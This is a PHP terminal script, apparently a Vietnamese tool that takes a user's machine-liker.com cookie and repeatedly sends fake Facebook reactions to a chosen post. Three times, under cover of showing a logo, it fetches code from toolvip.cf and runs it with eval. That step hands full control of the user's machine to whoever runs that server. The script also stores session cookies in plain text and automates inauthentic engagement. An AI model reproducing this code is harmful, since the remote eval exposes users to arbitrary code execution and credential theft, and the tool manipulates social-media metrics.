
error_reporting(0); 
session_start(); 
$ress = "\033[0;32m";
$res = "\033[0;33m";
$red = "\033[0;31m";
$green = "\033[0;37m";
$yellow = "\033[0;33m";
$white = "\033[1;37m";
$xnhac = "\033[1;96m";
$den = "\033[1;90m";
$do = "\033[1;91m";
$luc = "\033[1;92m";
$vang = "\033[1;93m";
$xduong = "\033[1;94m";
$hong = "\033[1;95m";
$trang = "\033[1;97m";
$do="\033[1;91m";
$maufulldo= "\e[1;47;31m";
$res="\033[0m";
$red="\e[1;31m";
$pink="\e[1;35m";
$green="\e[1;32m";
$yellow="\e[1;33m";
$y2="\033[0;33m";
$cyan= "\e[1;36m";
$blue="\e[1;34m";
$ngreen="\033[42m";
$ngblack="\033[40m";
$nen="\033[1;47;1;34m";
date_default_timezone_set("Asia/Ho_Chi_Minh"); 
@system('clear'); 
echo "Vui lÃ²ng chá»..\r";
eval(file_get_contents("https://toolvip.cf/logo.php"));
echo "\033[1;32m[\033[1;31mâ—\033[1;32m]$white =>$green TOOL AUTO MACHINE-LIKER \n"; 
echo "\033[1;32m[\033[1;31mâ—\033[1;32m]\033[1;37m => ".$do."Báº£n Quyá»n:$trang Cuong-Tool\n";
usleep(100000);
echo "\033[1;32m[\033[1;31mâ—\033[1;32m]$white =>$luc Momo:$vang 0977094720$trang (Äá»— VÄƒn CÆ°á»ng)\n"; usleep(100000);
echo "\033[1;32m[\033[1;31mâ—\033[1;32m]$white =>$green Donate Äá»ƒ CÃ³ Äá»™ng Lá»±c Viáº¿t Tool\n";
echo $thanhngang;
    usleep(100000);
$CheckCookie = file_exists("CookieMachineLiker.txt"); if($CheckCookie == "1"){ usleep(200000); echo "\033[1;92m[\033[1;91mâ—\033[1;92m]\033[1;97m => \033[1;92mNháº­p \033[1;93m[\033[1;97m 1 \033[1;93m] \033[1;92mCháº¡y cookie má»›i\n"; usleep(200000); echo "\033[1;92m[\033[1;91mâ—\033[1;92m]\033[1;97m => \033[1;92mNháº­p \033[1;93m[\033[1;97m 2 \033[1;93m] \033[1;92mCháº¡y cookie cÅ©\n"; usleep(200000); echo "\033[1;92m[\033[1;91mâ—\033[1;92m]\033[1;97m => \033[1;92mNháº­p \033[1;93m[\033[1;97m 1 or 2 \033[1;93m]: \033[1;97m"; 
$choose = trim(fgets(STDIN)); 
echo $thanhngang;
} if($choose != "2" or $CheckCookie != "1"){ 
do { 
unlink("CookieMachineLiker.txt"); 
$KhoCookieMachineLiker = []; 
echo "\033[1;92m[\033[1;91mâ—\033[1;92m]\033[1;97m => \033[1;92mNháº­p Cookie Machine-Liker: \033[1;92m"; 

$NhapCookie = (string)trim(fgets(STDIN)); 

array_push($KhoCookieMachineLiker, $NhapCookie); 
$mf = fopen("CookieMachineLiker.txt", "a+"); 
$txt = $NhapCookie."\n"; 
fwrite($mf, $txt); 
fclose($mf); 

$DemCookie = count($KhoCookieMachineLiker); 
echo "\033[1;93m[\033[1;97mSAVE\033[1;93m] \033[1;97m=> \033[1;92mÄÃ£ LÆ°u \033[1;93m$DemCookie \033[1;92mCookie Machine Liker VÃ o File \033[1;97mCookieMachineLiker.txt\n"; 
sleep(2); 
} 
while (count($KhoCookieMachineLiker) == 0); 
} else { 
$k = file_get_contents("CookieMachineLiker.txt"); $KhoCookieMachineLiker = explode("\n", $k); 
$s = count($KhoCookieMachineLiker) -1; array_splice($KhoCookieMachineLiker, $s, 1); 
} 
@system('clear'); 
echo "Vui lÃ²ng chá»..\r";
eval(file_get_contents("https://toolvip.cf/logo.php"));
 echo "\033[1;32m[\033[1;31mâ—\033[1;32m]$white =>$BGreen TOOL AUTO MACHINE-LIKER \n"; usleep(100000);
echo "\033[1;32m[\033[1;31mâ—\033[1;32m]$white =>$luc Momo:$vang 0977094720$trang (Äá»— VÄƒn CÆ°á»ng)\n"; usleep(100000);
echo "\033[1;32m[\033[1;31mâ—\033[1;32m]$white =>$BGreen Donate Äá»ƒ CÃ³ Äá»™ng Lá»±c Viáº¿t Tool\n";
echo $thanhngang;
    usleep(100000);
usleep(200000); echo "\033[1;93m[\033[1;97mNOTE\033[1;93m] \033[1;97m=> \033[1;92mLáº¥y Link BÃ i Viáº¿t Hoáº·c áº¢nh á»ž á»¨ng Dá»¥ng \033[1;93mFacbook\n"; 
echo "\033[1;92m[\033[1;91mâ—\033[1;92m]\033[1;97m => \033[1;92mNháº­p Link BÃ i Viáº¿t Hoáº·c áº¢nh: \033[1;97m"; 
$Link = trim(fgets(STDIN)); 
$GetLink = "\033[1;93mÄang GET ID Tá»« Link BÃ i Viáº¿t..."; $RunGetLink = strlen($GetLink); 
for ($x = 0;$x < $RunGetLink; $x++) { echo $GetLink[$x]; usleep(5000); } 
$DataLink = GetUID($Link); 
echo "\r"; 
if (strpos($DataLink, 'error') != FALSE) { 
$DecodeJS = json_decode($DataLink, TRUE); 
$LinkError = $DecodeJS['error']; 
if ($LinkError == "Link khÃ´ng tá»“n táº¡i hoáº·c chÆ°a Ä‘á»ƒ cháº¿ Ä‘á»™ cÃ´ng khai!"){ 
$LinkError = "Link KhÃ´ng Tá»“n Táº¡i Hoáº·c KhÃ´ng Äá»ƒ Cháº¿ Äá»™ CÃ´ng Khai."; 
}else if ($LinkError == "Vui lÃ²ng nháº­p Ä‘Ãºng link facebook") { $LinkError = "Vui LÃ²ng Nháº­p ÄÃºng Link Facebook."; 
}else if ($LinkError == "Thiáº¿u dá»¯ liá»‡u Ä‘áº§u vÃ o!") { 
$LinkError = "Vui LÃ²ng KhÃ´ng ÄÆ°á»£c Bá» Trá»‘ng."; 
}else if ($LinkError == "Vui lÃ²ng thá»­ láº¡i!") { 
$LinkError = "Vui LÃ²ng Thá»­ Láº¥y Láº¡i Link."; } 
echo "\033[1;91m[ERROR] \033[1;97m=> \033[1;91m$LinkError\n"; } 
$UII = explode('id":', $DataLink)[1]; 
$UIDD = explode(',', $UII)[0]; 
$EX = substr($UIDD, 0, 1); 
$Dau = '"'; if ($EX == $Dau) { 
$UI = explode('id":"', $DataLink)[1]; 
$UID = explode('",', $UI)[0]; 
}else{ 
$UI = explode('id":', $DataLink)[1]; 
$UID = explode(',', $UI)[0]; } 
$CheckUID = intval($UID); 
if ($CheckUID == "0") { 
echo "\033[1;91m[ERROR] \033[1;97m=> \033[1;91mGET ID BÃ i Viáº¿t Lá»—i.\n"; echo "\033[1;93m[\033[1;97mNOTE\033[1;93m] \033[1;97m=> \033[1;92mLáº¥y ID Táº¡i: \033[1;93mhttps://id.traodoisub.com\n"; echo "\033[1;92m[\033[1;91mâ—\033[1;92m]\033[1;97m => \033[1;92mNháº­p ID BÃ i Viáº¿t Hoáº·c áº¢nh: \033[1;97m"; 
$UID = trim(fgets(STDIN)); 
}else{ 
	
@system('clear'); 
echo "Vui lÃ²ng chá»..\r";
eval(file_get_contents("https://toolvip.cf/logo.php"));
 echo "\033[1;32m[\033[1;31mâ—\033[1;32m]$white =>$BGreen TOOL AUTO MACHINE-LIKER \n"; usleep(100000);
echo "\033[1;32m[\033[1;31mâ—\033[1;32m]$white =>$luc Momo:$vang 0977094720$trang (Äá»— VÄƒn CÆ°á»ng)\n"; usleep(100000);
echo "\033[1;32m[\033[1;31mâ—\033[1;32m]$white =>$BGreen Donate Äá»ƒ CÃ³ Äá»™ng Lá»±c Viáº¿t Tool\n";
echo $thanhngang;
$succuid = "\033[1;97m=> \033[1;92mID BÃ i Viáº¿t Cá»§a Báº¡n LÃ : \033[1;93m$UID\n"; 
$runsuccuid = strlen($succuid); 
for ($x = 0; $x < $runsuccuid; $x++) { 
echo $succuid[$x]; 
usleep(5000); } 
} 
echo $thanhngang;
$type = ""; usleep(5000); 
echo $lime."\033[1;32m[\033[1;31mâ—\033[1;32m]$white => \033[1;32m Nháº­p \033[1;31m[\033[1;33m1\033[1;31m] \033[1;32mBuff Auto Like\n";
echo $lime."\033[1;32m[\033[1;31mâ—\033[1;32m]$white => \033[1;32m Nháº­p \033[1;31m[\033[1;33m2\033[1;31m] \033[1;32mBuff Auto Love\n";
echo $lime."\033[1;32m[\033[1;31mâ—\033[1;32m]$white => \033[1;32m Nháº­p \033[1;31m[\033[1;33m3\033[1;31m] \033[1;32mBuff Auto Haha\n";
echo $lime."\033[1;32m[\033[1;31mâ—\033[1;32m]$white => \033[1;32m Nháº­p \033[1;31m[\033[1;33m4\033[1;31m] \033[1;32mBuff Auto Wow\n";
echo $lime."\033[1;32m[\033[1;31mâ—\033[1;32m]$white => \033[1;32m Nháº­p \033[1;31m[\033[1;33m5\033[1;31m] \033[1;32mBuff Auto Sab\n";
echo $lime."\033[1;32m[\033[1;31mâ—\033[1;32m]$white => \033[1;32m Nháº­p \033[1;31m[\033[1;33m6\033[1;31m] \033[1;32mBuff Auto Angry\n";
echo $lime."\033[1;32m[\033[1;31mâ—\033[1;32m]$white => \033[1;32m Nháº­p \033[1;31m[\033[1;33m7\033[1;31m] \033[1;32mBuff Auto Care\n";
echo $lime."\033[1;32m[\033[1;31mâ—\033[1;32m]$white => \033[1;32m Nháº­p \033[1;31m[\033[1;33m8\033[1;31m] \033[1;32mBuff Auto All\n";
echo $lime."\033[1;32m[\033[1;31mâ—\033[1;32m]$white => \033[1;32m Nháº­p Cháº¿ Äá»™: \033[1;33m";
 $c = trim(fgets(STDIN)); 
echo $thanhngang;
if($c == 1){
    $type = "1";
  }elseif($c == 2){
    $type = "2";
  }elseif($c == 3){
    $type = "4";
  }elseif($c == 4){
    $type = "3";
  }elseif($c == 5){
    $type = "7";
  }elseif($c == 6){
    $type = "8";
  }elseif($c == 7){
    $type = "16";
  }else{
    $type = "1%2C2%2C16%2C4%2C3%2C7%2C8";
  }

echo "\033[1;92m[\033[1;91mâ—\033[1;92m]\033[1;97m => \033[1;92mBÃ i Viáº¿t ÄÆ°á»£c Bao NhiÃªu Like ThÃ¬ Dá»«ng Tools: \033[1;97m"; 
$Tong = trim(fgets(STDIN)); 
$DataSelect = $type; 
echo $thanhngang;
$stt = 0; 
while (true) { 
for($xz = 0; $xz < count($KhoCookieMachineLiker); $xz++) { $Cookie = $KhoCookieMachineLiker[$xz]; echo "\r"; $GetDataWeb = "\033[1;93m Äang Láº¥y Dá»¯ Liá»‡u Tá»« Cookie Website..."; 
$RunGetDataWeb = strlen($GetDataWeb); 
for ($x = 0; $x < $RunGetDataWeb; $x++) { echo $GetDataWeb[$x]; usleep(5000); } 
$DataID = GetData($UID, $Cookie); 
echo "\r"; 
$Send = "\033[1;92m[CÆ°á»ng Tool] \033[1;97m=> \033[1;92mÄang TÄƒng Like Cho BÃ i Viáº¿t..."; 
$RunSend = strlen($Send); 
for ($x = 0; $x < $RunSend; $x++) { 
echo $Send[$x]; usleep(5000); } 
$Sending = SendReaction($DataID, $DataSelect, $Cookie); 
$SendStatus = $Sending["status"]; $SendTypeInfo = $Sending['info']['type']; 
$SendTypeError = $Sending['error']['type']; 
if ($SendStatus == "ok" && $SendTypeInfo = "reactions_sent") { 
echo "\r"; 
$stt ++; $GetLike = $Sending["info"]["total_reactions"]; 
$Total_Like = number_format($Sending["info"]["total_reactions"]); 
$GetSL = $Sending["info"]["message"]; 
$DemTXT = strlen($GetSL); if ($DemTXT == "44") { $left = "0"; $right = "2"; }else if ($DemTXT == "45") { $left = "0"; $right = "3"; }else { $left = "0"; $right = "0"; } $SoLuong = substr($GetSL, $left, $right); 

$Success = "\033[1;35m[\033[1;97m".$stt."\033[1;35m]\033[1;91m â— \033[1;96m".date("H:i")."\033[1;91m â—\033[1;97m $UID\033[1;91m â— \033[1;92m+$SoLuong Like \033[1;91mâ— \033[1;93mTá»•ng: \033[1;97m".$Total_Like." \033[1;93mLike\n"; 
$RunSuccess = strlen($Success); 
for ($x = 0; $x < $RunSuccess; $x++) { echo $Success[$x]; usleep(5000); } if ($GetLike > $Tong) { exit ("\033[1;92m[SUCCESS] \033[1;97m=> \033[1;92mÄÃ£ HoÃ n ThÃ nh \033[1;97m$Total_Like\033[1;92m Like\n"); } }else if ($SendStatus == "fail" && $SendTypeError == "cooldown") { $Count = GetDataCount($UID, $Cookie); 
echo "\r"; 
echo "\033[1;93m[\033[1;97mSEVER\033[1;93m] \033[1;97m=> \033[1;92mVui LÃ²ng Chá» LÆ°á»£t Cháº¡y Tiáº¿p Theo Sau \033[1;93m$Count \033[1;92mGiÃ¢y.\n"; 
}else if ($SendStatus == "fail" && $SendTypeError == "unauthorized") { 
echo "\r"; 
exit ("\033[1;91m[ERROR] \033[1;97m=> \033[1;91mLá»—i, Cookie Die Hoáº·c Facebook ÄÃ£ Bá»‹ Out.\n"); 
}else { echo "\r"; } } 
delay(GetDataCount($UID, $Cookie)); } 

function delay($delay) {
    $time = $delay; 
    for ( $x = $time; $x--; $x ) {
      echo "\r                                                      \r";
       echo "\r \033[1;32m[Cuong-Tool]\033[1;31m Tiáº¿p tá»¥c sau>\033[1;93m $x\033[1;91m |";
usleep(175000);
echo "\033[1;31m â¯";
usleep(175000);
echo "\033[1;32m â¯";
usleep(175000);
echo "\033[1;33m â¯";
usleep(175000);
echo "\033[1;34m â¯";
usleep(175000);
echo "\033[1;35m â¯";
usleep(175000);
        echo "\r                                                      \r";
}}

function GetUID($Link) { 
$ch = curl_init('https://id.traodoisub.com/api.php'); 
$data= ('link=').$Link; 
$head[] = "Host:id.traodoisub.com"; $head[] = "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36"; 
$head[] = "content-type:application/x-www-form-urlencoded; charset=UTF-8"; curl_setopt($ch, CURLOPT_PORT, "443"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 
curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
curl_setopt($ch, CURLOPT_HTTPHEADER, $head); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); 
$result = curl_exec($ch); 
curl_close($ch); 
return $result; 
} 
function GetData($UID, $Cookie) { 
$ch = curl_init("https://www.machine-liker.com/send-reactions/?post_id=$UID"); 
$head[] = "Host:www.machine-liker.com"; 
$head[] = "user-agent:Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36"; 
$head[] = "content-type:application/x-www-form-urlencoded; charset=UTF-8"; $head[] = "Cookie: $Cookie"; 
curl_setopt($ch, CURLOPT_PORT, "443"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 
curl_setopt($ch, CURLOPT_HTTPHEADER, $head); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET"); 
$result = curl_exec($ch); 
$h = explode('name="node_id" value="', $result)[1]; 
$h2 = explode('"', $h)[0]; 
curl_close($ch); 
return $h2; 
} 
function SendReaction($DataID, $DataSelect, $Cookie) { 
$ch = curl_init(); 
$head[] = "Host:www.machine-liker.com"; 
$head[] = "user-agent:Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36"; 
$head[] = "content-type:application/x-www-form-urlencoded; charset=UTF-8"; 
$head[] = "Cookie: $Cookie"; 
$url = "https://www.machine-liker.com/api/send-reactions/"; 
$data ="node_id=$DataID&reactions=$DataSelect&limit=100"; curl_setopt($ch, CURLOPT_PORT, "443"); 
curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 
curl_setopt($ch, CURLOPT_HTTPHEADER, $head); 
curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); 
$result = curl_exec($ch); curl_close($ch); 
$js = json_decode($result, TRUE); curl_close($ch); 
return $js; 
} 
function GetDataCount($UID, $Cookie) { 
$ch = curl_init("https://www.machine-liker.com/send-reactions/?post_id=$UID"); 
$head[] = "Host:www.machine-liker.com"; $head[] = "user-agent:Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36"; 
$head[] = "content-type:application/x-www-form-urlencoded; charset=UTF-8"; $head[] = "Cookie: $Cookie"; 
curl_setopt($ch, CURLOPT_PORT, "443"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); 
curl_setopt($ch, CURLOPT_HTTPHEADER, $head); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET"); 
$result = curl_exec($ch); 
$h = explode('data-countdown="', $result)[1]; 
$h2 = explode('"', $h)[0]; 
curl_close($ch); 
return $h2; 
} 
